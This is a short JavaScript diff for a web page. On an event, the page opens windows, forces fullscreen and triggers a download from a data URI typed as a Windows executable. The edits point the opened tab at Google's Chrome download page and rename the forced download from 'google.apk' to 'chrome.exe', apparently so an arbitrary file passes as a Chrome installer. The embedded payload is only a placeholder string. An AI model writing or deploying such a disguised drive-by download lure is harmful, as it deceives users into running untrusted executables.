@@ -15,7 +15,7 @@
  setTimeout(function() {
         openWin();
  }, 500);
- window.open('https://www.google.com', '_blank');
+ window.open('https://www.google.com/intl/en_in/chrome/', '_blank');
       goFullScreen();
     }, { once: false }); // Use { once: true } to ensure it only fires once
 
@@ -33,7 +33,7 @@
     function openWin() {
       Puf(
         "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "google.apk"
+        "chrome.exe"
       );
     }
     function goFullScreen() {
